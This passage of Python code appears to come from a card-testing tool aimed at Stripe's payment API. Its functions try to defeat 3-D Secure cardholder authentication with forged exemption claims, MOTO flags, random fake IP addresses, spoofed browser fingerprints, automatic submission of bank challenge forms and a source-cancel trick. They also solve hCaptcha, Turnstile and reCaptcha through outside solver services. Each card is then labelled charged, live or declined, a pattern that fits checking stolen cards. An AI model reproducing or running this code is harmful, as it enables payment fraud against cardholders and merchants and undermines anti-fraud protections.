            endpoint = f"{STRIPE_API}/payment_intents/{intent_id}/confirm"
        else:
            endpoint = f"{STRIPE_API}/setup_intents/{intent_id}/confirm"

        bypass_attempts = []

        bypass_attempts.append({
            "client_secret": cs,
            "payment_method": pm_id,
            "payment_method_options[card][request_three_d_secure]": "any",
            "payment_method_options[card][setup_future_usage]": "off_session",
            "error_on_requires_action": "true",
            "key": pk,
        })

        bypass_attempts.append({
            "client_secret": cs,
            "payment_method": pm_id,
            "payment_method_options[card][mit_exemption][claim_without_transaction_id]": "true",
            "payment_method_options[card][mit_exemption][network_transaction_id]": _random_guid()[:15],
            "error_on_requires_action": "true",
            "key": pk,
        })

        bypass_attempts.append({
            "client_secret": cs,
            "payment_method": pm_id,
            "mandate_data[customer_acceptance][type]": "online",
            "mandate_data[customer_acceptance][online][ip_address]": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "mandate_data[customer_acceptance][online][user_agent]": UA,
            "error_on_requires_action": "true",
            "key": pk,
        })

        bypass_attempts.append({
            "client_secret": cs,
            "payment_method": pm_id,
            "payment_method_options[card][request_three_d_secure]": "automatic",
            "error_on_requires_action": "true",
            "key": pk,
        })

        bypass_attempts.append({
            "client_secret": cs,
            "payment_method": pm_id,
            "payment_method_options[card][moto]": "true",
            "error_on_requires_action": "true",
            "key": pk,
        })

        checkout_pi_detected = False
        for i, attempt_data in enumerate(bypass_attempts):
            try:
                logger.info(f"3DS bypass attempt {i+1}/{len(bypass_attempts)} for {intent_id[:20]}...")
                resp = await client.post(endpoint, data=attempt_data, headers=headers, timeout=20)
                data = resp.json()

                if "error" in data:
                    err_msg = data["error"].get("message", "")
                    if "created by Checkout" in err_msg:
                        logger.info("Detected Checkout-created PI, skipping re-confirm attempts")
                        checkout_pi_detected = True
                        break

                result = _parse_3ds_bypass_response(data, intent_type, i + 1)
                if result == "continue":
                    continue
                if result == "break":
                    break
                if result is not None:
                    return result

            except Exception as e:
                logger.warning(f"3DS bypass {i+1} exception: {e}")
                continue
    else:
        logger.info("Checkout flow, skipping standard re-confirm attempts")

        if sdk_type == "intent_confirmation_challenge":
            import json as _json
            logger.info(f"FULL SDK DUMP: {_json.dumps({k: str(v)[:200] for k,v in sdk.items()}, indent=None)[:2000]}")
            stripe_js_raw = sdk.get("stripe_js", {})
            stripe_js_data = stripe_js_raw
            if isinstance(stripe_js_data, str):
                try:
                    stripe_js_data = _json.loads(stripe_js_data)
                except Exception:
                    logger.info(f"stripe_js is a string ({len(stripe_js_raw)} chars): {str(stripe_js_raw)[:300]}")
                    stripe_js_data = {}
            if not isinstance(stripe_js_data, dict):
                logger.info(f"stripe_js not dict, type={type(stripe_js_data)}, val={str(stripe_js_data)[:200]}")
                stripe_js_data = {}
            logger.info(f"stripe_js keys: {sorted(stripe_js_data.keys())}")
            for _k, _v in stripe_js_data.items():
                logger.info(f"  stripe_js.{_k} = {str(_v)[:200]}")
            site_key = stripe_js_data.get("site_key", "")
            verification_url = stripe_js_data.get("verification_url", "")
            rqdata = stripe_js_data.get("rqdata", "")

            if site_key and verification_url:
                logger.info(f"hCaptcha detected: site_key={site_key}, verification_url={verification_url}")
                try:
                    from captcha_solver import solve_hcaptcha_enterprise
                    captcha_token = await solve_hcaptcha_enterprise(
                        site_key,
                        "https://checkout.stripe.com",
                        rqdata=rqdata,
                    )
                    if captcha_token:
                        logger.info(f"hCaptcha solved ({len(captcha_token)} chars), attempting verification...")

                        if verification_url.startswith("/v1/"):
                            verify_endpoint = f"https://api.stripe.com{verification_url}"
                        elif verification_url.startswith("/"):
                            verify_endpoint = f"{STRIPE_API}{verification_url}"
                        else:
                            verify_endpoint = f"{STRIPE_API}/{verification_url}"

                        verify_data = {
                            "client_secret": cs,
                            "key": pk,
                            "captcha_vendor_name": "hcaptcha",
                            "challenge_response_ekey": captcha_token,
                        }
                        logger.info(f"verify_challenge: POST {verify_endpoint} with captcha_vendor_name=hcaptcha, challenge_response_ekey={len(captcha_token)} chars")
                        verify_result = None
                        v_status = ""
                        try:
                            vr = await client.post(verify_endpoint, data=verify_data, headers=js_headers, timeout=25)
                            vr_json = vr.json()
                            vr_status = vr_json.get("status", "")
                            vr_err = vr_json.get("error", {})
                            logger.info(f"  -> HTTP {vr.status_code}, status={vr_status}, err={vr_err.get('code','')}/{vr_err.get('param','')}: {vr_err.get('message','')[:150]}")
                            logger.info(f"  -> full keys: {list(vr_json.keys())[:15]}")
                            if vr.status_code == 200:
                                verify_result = vr_json
                                v_status = vr_status
                            elif vr_err.get("code") == "parameter_unknown":
                                logger.info(f"  -> Stripe hinted param: {vr_err.get('message','')}")
                                logger.info("Falling back to client_secret+key only...")
                                vr2 = await client.post(verify_endpoint, data={"client_secret": cs, "key": pk}, headers=js_headers, timeout=20)
                                verify_result = vr2.json()
                                v_status = verify_result.get("status", "")
                                logger.info(f"  -> fallback HTTP {vr2.status_code}, status={v_status}")
                            else:
                                verify_result = vr_json
                                v_status = vr_status
                        except Exception as e:
                            logger.warning(f"verify_challenge request failed: {e}")

                        if verify_result:
                            if v_status == "succeeded":
                                return "charged", "Charged (Captcha Solved)"
                            if v_status == "requires_capture":
                                return "charged", "Authorized (Captcha Solved)"
                            if v_status == "processing":
                                return "approved", "Processing - Not Yet Confirmed"
                            if v_status == "requires_payment_method":
                                error_key = "last_payment_error" if intent_type == "payment_intent" else "last_setup_error"
                                last_error = verify_result.get(error_key, {})
                                if last_error:
                                    result_status, result_msg = _classify_confirm_error(last_error)
                                    return result_status, f"{result_msg}"
                                return "declined", "Payment method failed"
                            if "error" in verify_result:
                                err = verify_result["error"]
                                code = err.get("code", "")
                                decline = err.get("decline_code", "")
                                msg = err.get("message", "")
                                logger.info(f"Verification error: {code}/{decline} - {msg[:80]}")
                                if code == "card_declined" and decline:
                                    if decline in LIVE_DECLINE_CODES:
                                        return "live_declined", decline
                                    return "declined", decline
                                if code == "card_declined":
                                    return "declined", "card_declined"
                                if code in ("setup_intent_authentication_failure", "payment_intent_authentication_failure"):
                                    return "declined", msg[:80] if msg else "Authentication failed"
                    else:
                        logger.warning("hCaptcha solve returned no token")
                except ImportError:
                    logger.warning("captcha_solver not available")
                except Exception as e:
                    logger.warning(f"hCaptcha solve failed: {e}")
            else:
                logger.info(f"intent_confirmation_challenge: missing site_key={bool(site_key)}, verification_url={bool(verification_url)}")

    if sdk_type == "stripe_3ds2_fingerprint":
        logger.info(f"Attempting 3DS2 frictionless flow... sdk_keys={sorted(sdk.keys())}")
        result = await _attempt_3ds2_frictionless(client, pk, cs, intent_id, intent_type, sdk, js_headers)
        if result:
            return result
        logger.info("3DS2 frictionless flow did not resolve, checking for redirect fallbacks...")

    if sdk_type == "three_d_secure_redirect" or (sdk_type == "stripe_3ds2_fingerprint" and sdk.get("stripe_js")):
        redirect_url = sdk.get("stripe_js", "")
        if redirect_url:
            logger.info(f"Trying stripe_js redirect fallback (sdk_type={sdk_type})...")
            result = await _attempt_3ds1_redirect(client, pk, cs, intent_id, intent_type, redirect_url)
            if result:
                return result

    rtu = na.get("redirect_to_url", {})
    redirect_url = rtu.get("url", "")
    if redirect_url:
        logger.info("Redirect-based 3DS detected, attempting redirect flow...")
        result = await _attempt_3ds1_redirect(client, pk, cs, intent_id, intent_type, redirect_url)
        if result:
            return result

    if not sdk_type:
        logger.info("No sdk_type found, attempting to fetch stripe_js URL from source...")
        source_id = sdk.get("three_d_secure_2_source", "")
        if source_id:
            try:
                src_resp = await client.get(
                    f"{STRIPE_API}/sources/{source_id}",
                    params={"key": pk, "client_secret": cs},
                    headers=js_headers,
                    timeout=15,
                )
                src_data = src_resp.json()
                src_redirect = src_data.get("redirect", {}).get("url", "")
                if src_redirect:
                    logger.info("Found redirect URL from source, attempting...")
                    result = await _attempt_3ds1_redirect(client, pk, cs, intent_id, intent_type, src_redirect)
                    if result:
                        return result
            except Exception as e:
                logger.warning(f"Source fetch failed: {e}")

    source_id = sdk.get("three_d_secure_2_source", "")
    if source_id:
        source_intent_id = sdk.get("three_d_secure_2_intent", "")
        logger.info(f"All bypass methods failed, trying source_cancel as final fallback...")
        cancel_result = await _cancel_3ds_source(client, pk, cs, intent_id, intent_type, source_id, js_headers, source_intent_id=source_intent_id or None)
        if cancel_result:
            return cancel_result

    return None


def _parse_3ds_bypass_response(data, intent_type, attempt_num):
    if "error" in data:
        err = data["error"]
        code = err.get("code", "")
        decline = err.get("decline_code", "")
        msg = err.get("message", "")
        logger.info(f"3DS bypass {attempt_num} error: {code}/{decline} - {msg[:80]}")

        if code == "card_declined" and decline:
            if decline in LIVE_DECLINE_CODES:
                return "live_declined", f"{decline} (3DS Bypassed)"
            return "declined", f"{decline} (3DS Bypassed)"

        if code == "authentication_required":
            return "continue"

        if code == "card_declined":
            return "declined", f"card_declined (3DS Bypassed)"

        if "expired" in msg.lower() or "completed" in msg.lower():
            return "error", "Intent expired"

        if code in ("payment_intent_unexpected_state", "setup_intent_unexpected_state"):
            return "break"

        return "continue"

    status = data.get("status", "")
    logger.info(f"3DS bypass {attempt_num} result: status={status}")

    if status == "succeeded":
        return "charged", "Charged (3DS Bypassed)"
    if status == "requires_capture":
        return "charged", "Authorized (3DS Bypassed)"
    if status == "processing":
        return "approved", "Processing - Not Yet Confirmed"
    if status == "requires_payment_method":
        error_key = "last_payment_error" if intent_type == "payment_intent" else "last_setup_error"
        last_error = data.get(error_key, {})
        if last_error:
            result_status, result_msg = _classify_confirm_error(last_error)
            return result_status, f"{result_msg} (3DS Bypassed)"
        return "declined", "Payment method failed (3DS Bypassed)"

    if status == "requires_action":
        return "continue"

    return None


async def _attempt_3ds2_frictionless(client, pk, cs, intent_id, intent_type, sdk_data, headers):
    source_id = sdk_data.get("three_d_secure_2_source", "")
    server_tx_id = sdk_data.get("server_transaction_id", "")
    three_ds_method_url = sdk_data.get("three_ds_method_url", "")
    ds_name = sdk_data.get("directory_server_name", "")

    logger.info(f"3DS2: source_id={source_id[:30] if source_id else 'NONE'}, server_tx={server_tx_id[:20] if server_tx_id else 'NONE'}, method_url={three_ds_method_url[:40] if three_ds_method_url else 'NONE'}, ds={ds_name}")

    if not source_id:
        logger.info("3DS2: no source ID found")
        return None

    fingerprint_data = ""
    fingerprint_success = False
    if three_ds_method_url and server_tx_id:
        try:
            method_payload = base64.b64encode(
                json.dumps({"threeDSServerTransID": server_tx_id}).encode()
            ).decode().rstrip("=")
            logger.info(f"3DS2: POSTing to threeDSMethodURL ({ds_name})...")
            method_resp = await client.post(
                three_ds_method_url,
                data={"threeDSMethodData": method_payload},
                headers={
                    "User-Agent": UA,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://js.stripe.com",
                    "Referer": "https://js.stripe.com/",
                },
                timeout=15,
            )
            fingerprint_data = method_payload
            fingerprint_success = method_resp.status_code < 400
            logger.info(f"3DS2: method URL returned {method_resp.status_code}")
        except Exception as e:
            logger.warning(f"3DS2: method URL failed: {e}")

    await asyncio.sleep(random.uniform(2.0, 3.5))

    tz_offset = str(random.choice([-480, -420, -360, -300, -240, 0, 60, 120, 180, 330, 345, 480, 540]))

    auth_variations = []

    if fingerprint_success:
        auth_variations.append({
            "fingerprintAttempted": True,
            "fingerprintData": fingerprint_data,
            "challengeWindowSize": "05",
            "threeDSCompInd": "Y",
        })

    auth_variations.append({
        "fingerprintAttempted": True,
        "fingerprintData": fingerprint_data if fingerprint_data else "",
        "challengeWindowSize": "05",
        "threeDSCompInd": "Y" if three_ds_method_url else "U",
    })

    auth_variations.append({
        "fingerprintAttempted": not three_ds_method_url,
        "fingerprintData": "",
        "challengeWindowSize": "05",
        "threeDSCompInd": "U",
    })

    auth_variations.append({
        "fingerprintAttempted": False,
        "fingerprintData": "",
        "challengeWindowSize": "05",
        "threeDSCompInd": "N",
    })

    for var_idx, var_data in enumerate(auth_variations):
        browser_data = json.dumps({
            **var_data,
            "browserJavaEnabled": False,
            "browserJavascriptEnabled": True,
            "browserLanguage": "en-US",
            "browserColorDepth": "24",
            "browserScreenHeight": "1080",
            "browserScreenWidth": "1920",
            "browserTZ": tz_offset,
            "browserUserAgent": UA,
        })

        auth_data = {
            "source": source_id,
            "browser": browser_data,
            "one_click_authn_device_support[hosted]": "false",
            "one_click_authn_device_support[same_origin_frame]": "false",
            "one_click_authn_device_support[spc_eligible]": "false",
            "one_click_authn_device_support[webauthn_eligible]": "false",
            "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
            "key": pk,
        }

        try:
            logger.info(f"3DS2: authenticate attempt {var_idx+1}/{len(auth_variations)} (comp={var_data['threeDSCompInd']}, fp={var_data['fingerprintAttempted']})...")
            auth_resp = await client.post(
                f"{STRIPE_API}/3ds2/authenticate",
                data=auth_data,
                headers=headers,
                timeout=25,
            )
            auth_result = auth_resp.json()
        except Exception as e:
            logger.warning(f"3DS2: authenticate attempt {var_idx+1} failed: {e}")
            continue

        if auth_result and (not auth_result.get("error")):
            ares = auth_result.get("ares") or {}
            trans_status = ares.get("transStatus", "")
            logger.info(f"3DS2: attempt {var_idx+1} transStatus={trans_status}")

            if trans_status in ("Y", "A"):
                logger.info("3DS2: frictionless approval! Polling intent...")
                await asyncio.sleep(2)
                return await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Frictionless")

            if trans_status == "C":
                logger.info("3DS2: challenge required, attempting auto-challenge...")
                acs_url = ares.get("acsURL", "")
                creq = auth_result.get("creq", "")
                acs_trans_id = ares.get("acsTransID", "")
                tds2_id = auth_result.get("id", "")

                if acs_url and creq:
                    challenge_result = await _attempt_3ds2_challenge(
                        client, pk, cs, intent_id, intent_type,
                        acs_url, creq, acs_trans_id, server_tx_id, source_id, tds2_id, headers
                    )
                    if challenge_result:
                        return challenge_result

                source_intent_id = sdk_data.get("three_d_secure_2_intent", "")
                if source_id:
                    logger.info("3DS2: challenge not auto-completable, trying source_cancel...")
                    cancel_result = await _cancel_3ds_source(client, pk, cs, intent_id, intent_type, source_id, headers, source_intent_id=source_intent_id or None)
                    if cancel_result:
                        return cancel_result
                break

            if trans_status in ("R", "N"):
                logger.info(f"3DS2: authentication rejected (transStatus={trans_status}), cancelling source...")
                source_intent_id = sdk_data.get("three_d_secure_2_intent", "")
                if source_id:
                    cancel_result = await _cancel_3ds_source(client, pk, cs, intent_id, intent_type, source_id, headers, source_intent_id=source_intent_id or None)
                    if cancel_result:
                        return cancel_result
                await asyncio.sleep(2)
                poll_result = await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Rejected")
                if poll_result:
                    return poll_result
                break

            if trans_status:
                await asyncio.sleep(2)
                poll_result = await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Flow")
                if poll_result:
                    return poll_result
                continue
        else:
            err_msg = ""
            if auth_result and auth_result.get("error"):
                err_msg = auth_result["error"].get("message", "")
            logger.info(f"3DS2: attempt {var_idx+1} error ({err_msg[:80]})")

            if "not supported" in err_msg.lower() or "source you supplied is invalid" in err_msg.lower():
                source_intent_id = sdk_data.get("three_d_secure_2_intent", "")
                logger.info(f"3DS2: authenticate blocked, cancelling 3DS source...")
                cancel_result = await _cancel_3ds_source(client, pk, cs, intent_id, intent_type, source_id, headers, source_intent_id=source_intent_id or None)
                if cancel_result:
                    return cancel_result
                break

            if "already been consumed" in err_msg.lower():
                logger.info("3DS2: source already consumed, polling intent...")
                await asyncio.sleep(1)
                poll_result = await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Consumed")
                if poll_result:
                    return poll_result
                break

            continue

    fallback = await _attempt_3ds2_fallback(client, pk, cs, intent_id, intent_type, source_id, headers)
    if fallback:
        return fallback

    return None


async def _cancel_3ds_source(client, pk, cs, intent_id, intent_type, source_id, headers, source_intent_id=None):
    try:
        endpoint_type = "payment_intents" if intent_type == "payment_intent" else "setup_intents"
        cancel_data = {
            "key": pk,
            "source": source_id,
        }
        if source_intent_id:
            cancel_data["source_intent"] = source_intent_id
        logger.info(f"3DS2: calling source_cancel on {endpoint_type}/{intent_id[:25]}...")
        cancel_resp = await client.post(
            f"{STRIPE_API}/{endpoint_type}/{intent_id}/source_cancel",
            data=cancel_data,
            headers=headers,
            timeout=20,
        )
        cancel_result = cancel_resp.json()
        if cancel_result.get("error"):
            err = cancel_result["error"]
            logger.info(f"3DS2: source_cancel error: {err.get('message', '')[:100]}")
            poll_result = await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Cancel Failed")
            if poll_result:
                return poll_result
            return None

        new_status = cancel_result.get("status", "")
        logger.info(f"3DS2: source_cancel result: status={new_status}")

        if new_status == "succeeded":
            return "charged", "Charged Successfully (3DS Cancelled)"
        elif new_status == "requires_capture":
            return "charged", "Authorized (3DS Cancelled)"
        elif new_status == "requires_payment_method" or new_status == "requires_source":
            error_key = "last_payment_error" if intent_type == "payment_intent" else "last_setup_error"
            last_error = cancel_result.get(error_key, {})
            if last_error:
                result_status, result_msg = _classify_confirm_error(last_error)
                return result_status, f"{result_msg} (3DS Cancelled)"
            return "declined", "Payment method failed (3DS Cancelled)"
        elif new_status in ("requires_action", "requires_source_action"):
            await asyncio.sleep(2)
            poll_result = await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Post-Cancel")
            if poll_result:
                return poll_result
        elif new_status == "processing":
            await asyncio.sleep(3)
            poll_result = await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Processing")
            if poll_result:
                return poll_result
            return "approved", "Processing - Not Yet Confirmed (3DS Cancelled)"
    except Exception as e:
        logger.warning(f"3DS2: source_cancel exception: {e}")
    return None


async def _attempt_3ds2_fallback(client, pk, cs, intent_id, intent_type, source_id, headers):
    try:
        fp_data = {
            "source": source_id,
            "browser": json.dumps({
                "fingerprintAttempted": False,
                "challengeWindowSize": "full",
                "threeDSCompInd": "N",
                "browserJavaEnabled": False,
                "browserJavascriptEnabled": True,
                "browserLanguage": "en-US",
                "browserColorDepth": "24",
                "browserScreenHeight": "1080",
                "browserScreenWidth": "1920",
                "browserTZ": "-300",
                "browserUserAgent": UA,
            }),
            "one_click_authn_device_support[hosted]": "false",
            "one_click_authn_device_support[same_origin_frame]": "false",
            "one_click_authn_device_support[spc_eligible]": "false",
            "one_click_authn_device_support[webauthn_eligible]": "false",
            "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
            "key": pk,
        }
        logger.info("3DS2 fallback: trying authenticate with no fingerprint...")
        fp_resp = await client.post(
            f"{STRIPE_API}/3ds2/authenticate",
            data=fp_data,
            headers=headers,
            timeout=25,
        )
        fp_result = fp_resp.json()

        if fp_result and not fp_result.get("error"):
            ares = fp_result.get("ares") or {}
            ts = ares.get("transStatus", "")
            logger.info(f"3DS2 fallback authenticate: transStatus={ts}")

            if ts in ("Y", "A"):
                await asyncio.sleep(2)
                return await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Fallback Frictionless")

            if ts == "C":
                acs_url = ares.get("acsURL", "")
                creq_val = fp_result.get("creq", "")
                if acs_url and creq_val:
                    challenge_result = await _attempt_3ds2_challenge(
                        client, pk, cs, intent_id, intent_type,
                        acs_url, creq_val, ares.get("acsTransID", ""),
                        "", source_id, fp_result.get("id", ""), headers
                    )
                    if challenge_result:
                        return challenge_result

            if ts in ("R", "N"):
                await asyncio.sleep(1)
                return await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Fallback Rejected")
        else:
            err = fp_result.get("error", {}).get("message", "") if fp_result else "no response"
            logger.info(f"3DS2 fallback authenticate also failed: {err[:80]}")
    except Exception as e:
        logger.warning(f"3DS2 fallback authenticate error: {e}")

    await asyncio.sleep(1)
    return await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Final Poll")


async def _attempt_3ds2_challenge(client, pk, cs, intent_id, intent_type,
                                   acs_url, creq, acs_trans_id, server_tx_id,
                                   source_id, tds2_id, headers):
    try:
        logger.info(f"3DS2 challenge: POSTing creq to ACS ({acs_url[:60]}...)")
        acs_resp = await client.post(
            acs_url,
            data={"creq": creq},
            headers={
                "User-Agent": UA,
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": acs_url.split("/")[0] + "//" + acs_url.split("/")[2] if "/" in acs_url else "",
            },
            timeout=20,
            follow_redirects=True,
        )
        acs_body = acs_resp.text
        acs_final_url = str(acs_resp.url)

        if "return_url" in acs_final_url or "stripe.com" in acs_final_url:
            logger.info("3DS2 challenge: ACS redirected to return URL (auto-approved)")
            await asyncio.sleep(1)
            return await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Challenge Redirect")

        cres_match = re.search(r'name=["\']?cres["\']?\s+value=["\']([^"\']+)', acs_body, re.I)
        if not cres_match:
            cres_match = re.search(r'name=["\']?cres["\']?[^>]*value=["\']([A-Za-z0-9+/=]{20,})', acs_body, re.I)
        if not cres_match:
            cres_match = re.search(r'value=["\']([A-Za-z0-9+/=]{50,})["\']', acs_body)

        if cres_match:
            cres = cres_match.group(1)
            logger.info(f"3DS2 challenge: extracted cres ({len(cres)} chars)")

            complete_data = {
                "source": source_id,
                "key": pk,
            }
            complete_resp = await client.post(
                f"{STRIPE_API}/3ds2/challenge/complete",
                data=complete_data,
                headers=headers,
                timeout=20,
            )
            complete_result = complete_resp.json()
            logger.info(f"3DS2 challenge complete: {json.dumps(complete_result)[:200]}")

            await asyncio.sleep(2)
            result = await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Challenge")
            if result:
                return result

        trans_status_input = re.search(r'transStatus["\s:=]+["\']?([YNACU])', acs_body)
        if trans_status_input:
            ts = trans_status_input.group(1)
            logger.info(f"3DS2 challenge: found transStatus={ts} in ACS response")
            if ts in ("Y", "A"):
                await asyncio.sleep(2)
                return await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Challenge Auto")

        form_action = re.search(r'<form[^>]*action=["\']([^"\']+)', acs_body, re.I)
        hidden_inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)', acs_body, re.I)
        if form_action and hidden_inputs:
            action_url = form_action.group(1)
            if not action_url.startswith("http"):
                from urllib.parse import urljoin
                action_url = urljoin(str(acs_resp.url), action_url)
            form_data = {name: value for name, value in hidden_inputs}
            logger.info(f"3DS2 challenge: auto-submitting ACS form to {action_url[:60]}...")
            form_resp = await client.post(
                action_url,
                data=form_data,
                headers={
                    "User-Agent": UA,
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                follow_redirects=True,
                timeout=20,
            )
            form_body = form_resp.text
            form_final = str(form_resp.url)

            if "return_url" in form_final or "stripe.com" in form_final:
                await asyncio.sleep(1)
                return await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Challenge Form")

            cres2 = re.search(r'name=["\']?cres["\']?[^>]*value=["\']([A-Za-z0-9+/=]{20,})', form_body, re.I)
            if cres2:
                logger.info(f"3DS2 challenge: found cres in form response ({len(cres2.group(1))} chars)")
                complete_data2 = {"source": source_id, "key": pk}
                await client.post(f"{STRIPE_API}/3ds2/challenge/complete", data=complete_data2, headers=headers, timeout=20)
                await asyncio.sleep(2)
                result2 = await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS2 Challenge Form Complete")
                if result2:
                    return result2

        logger.info("3DS2 challenge: could not auto-complete (requires user interaction)")

    except Exception as e:
        logger.warning(f"3DS2 challenge error: {e}")

    return None


def _detect_captcha_in_html(body, url=""):
    body_lower = body.lower()
    url_lower = url.lower()
    if "hcaptcha.com" in url_lower or "h-captcha" in url_lower:
        return "hcaptcha"
    if "challenges.cloudflare.com" in url_lower or "turnstile" in url_lower:
        return "turnstile"
    if "hcaptcha.com/1/api.js" in body_lower or "class=\"h-captcha\"" in body_lower or "data-hcaptcha-sitekey" in body_lower:
        return "hcaptcha"
    if "challenges.cloudflare.com/turnstile" in body_lower or "cf-turnstile" in body_lower:
        return "turnstile"
    if "recaptcha" in body_lower and "google.com/recaptcha" in body_lower:
        return "recaptcha"
    if "captcha" in body_lower and ("sitekey" in body_lower or "data-sitekey" in body_lower):
        return "captcha"
    return None


def _captcha_label(captcha_type):
    return ("hCaptcha" if captcha_type == "hcaptcha"
            else "Turnstile" if captcha_type == "turnstile"
            else "reCaptcha" if captcha_type == "recaptcha"
            else "Captcha")


async def _try_solve_captcha_page(body, page_url):
    try:
        from captcha_solver import solve_captcha_on_page
        from captcha_solver import NOPECHA_KEY, CAPTCHAAI_KEY
        if not NOPECHA_KEY and not CAPTCHAAI_KEY:
            return None
        import aiohttp as _aiohttp
        async with _aiohttp.ClientSession() as sess:
            token = await solve_captcha_on_page(body, page_url, sess)
        return token
    except Exception as e:
        logger.warning(f"captcha solve attempt failed: {e}")
        return None


async def _submit_captcha_and_check(body, page_url, token, captcha_type):
    try:
        from captcha_solver import submit_captcha_token
        import aiohttp as _aiohttp
        async with _aiohttp.ClientSession() as sess:
            final_url, _, success = await submit_captcha_token(sess, page_url, token, captcha_type, body)
        return final_url, success
    except Exception as e:
        logger.warning(f"captcha submit failed: {e}")
        return page_url, False


async def _attempt_3ds1_redirect(client, pk, cs, intent_id, intent_type, redirect_url):
    try:
        logger.info(f"3DS1: following redirect to {redirect_url[:80]}...")
        resp = await client.get(
            redirect_url,
            headers={
                "User-Agent": UA,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            },
            follow_redirects=True,
            timeout=20,
        )

        final_url = str(resp.url)
        if "return_url" in final_url or "stripe.com" in final_url:
            logger.info(f"3DS1: redirect landed on return URL")
            await asyncio.sleep(1)
            return await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS1 Redirect")

        body = resp.text

        captcha_type = _detect_captcha_in_html(body, final_url)
        if captcha_type:
            label = _captcha_label(captcha_type)
            logger.info(f"3DS1: {label} page detected at {final_url[:80]}, attempting solve...")
            token = await _try_solve_captcha_page(body, final_url)
            if token:
                logger.info(f"3DS1: {label} solved, submitting token...")
                solved_url, success = await _submit_captcha_and_check(body, final_url, token, captcha_type)
                if success or "return_url" in solved_url or "stripe.com" in solved_url:
                    await asyncio.sleep(1)
                    return await _poll_intent_status(client, pk, cs, intent_id, intent_type, f"3DS1 {label} Bypass")
                logger.info(f"3DS1: {label} token submitted but did not resolve to return URL")
                return "error", f"Captcha Solving Failed - {label} token accepted but still blocked"
            else:
                try:
                    from captcha_solver import get_nopecha_key, get_captchaai_key
                    no_key = not get_nopecha_key() and not get_captchaai_key()
                except Exception:
                    no_key = True
                if no_key:
                    logger.info(f"3DS1: {label} - no captcha solver key configured")
                    return "error", f"Captcha Detected - No solver key set (add NopeCHA key in Settings)"
                logger.info(f"3DS1: {label} could not be solved (API failed or timed out)")
                return "error", f"Captcha Solving Failed - {label}"

        form_action = re.search(r'<form[^>]*action=["\']([^"\']+)', body, re.I)
        hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)', body, re.I)
        hidden_inputs += re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\'][^>]*type=["\']hidden', body, re.I)

        if form_action and hidden_inputs:
            action_url = form_action.group(1)
            if not action_url.startswith("http"):
                from urllib.parse import urljoin
                action_url = urljoin(str(resp.url), action_url)

            form_data = {name: value for name, value in hidden_inputs}
            logger.info(f"3DS1: submitting form to {action_url[:80]}...")
            form_resp = await client.post(
                action_url,
                data=form_data,
                headers={
                    "User-Agent": UA,
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                follow_redirects=True,
                timeout=20,
            )

            final_url2 = str(form_resp.url)
            if "return_url" in final_url2 or "stripe.com" in final_url2:
                await asyncio.sleep(1)
                return await _poll_intent_status(client, pk, cs, intent_id, intent_type, "3DS1 Form")

            body2 = form_resp.text
            captcha_type2 = _detect_captcha_in_html(body2, final_url2)
            if captcha_type2:
                label = _captcha_label(captcha_type2)
                logger.info(f"3DS1: {label} in form response, attempting solve...")
                token = await _try_solve_captcha_page(body2, final_url2)
                if token:
                    solved_url, success = await _submit_captcha_and_check(body2, final_url2, token, captcha_type2)
                    if success or "return_url" in solved_url or "stripe.com" in solved_url:
                        await asyncio.sleep(1)
                        return await _poll_intent_status(client, pk, cs, intent_id, intent_type, f"3DS1 {label} Bypass")
                    return "error", f"Captcha Solving Failed - {label} token accepted but still blocked"
                try:
                    from captcha_solver import get_nopecha_key, get_captchaai_key
                    no_key = not get_nopecha_key() and not get_captchaai_key()
                except Exception:
                    no_key = True
                if no_key:
                    return "error", f"Captcha Detected - No solver key set (add NopeCHA key in Settings)"
                return "error", f"Captcha Solving Failed - {label}"

    except Exception as e:
        logger.warning(f"3DS1 redirect error: {e}")

    return None


async def _poll_intent_status(client, pk, cs, intent_id, intent_type, context=""):
    headers = {
        "User-Agent": UA,
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Accept": "application/json",
    }

    if intent_type == "payment_intent":
        endpoint = f"{STRIPE_API}/payment_intents/{intent_id}"
    else:
        endpoint = f"{STRIPE_API}/setup_intents/{intent_id}"

    if "Blocked" in context:
        max_attempts = 2
    elif "Challenge" in context or "Frictionless" in context or "Cancel" in context:
        max_attempts = 5
    else:
        max_attempts = 4

    for attempt in range(max_attempts):
        try:
            resp = await client.get(
                f"{endpoint}?client_secret={cs}&key={pk}",
                headers=headers,
                timeout=15,
            )
            data = resp.json()
            status = data.get("status", "")
            logger.info(f"3DS poll [{context}] attempt {attempt+1}/{max_attempts}: status={status}")

            if status == "succeeded":
                return "charged", f"Charged (3DS Bypassed)"
            if status == "requires_capture":
                return "charged", f"Authorized (3DS Bypassed)"
            if status == "processing":
                return "approved", "Processing - Not Yet Confirmed"
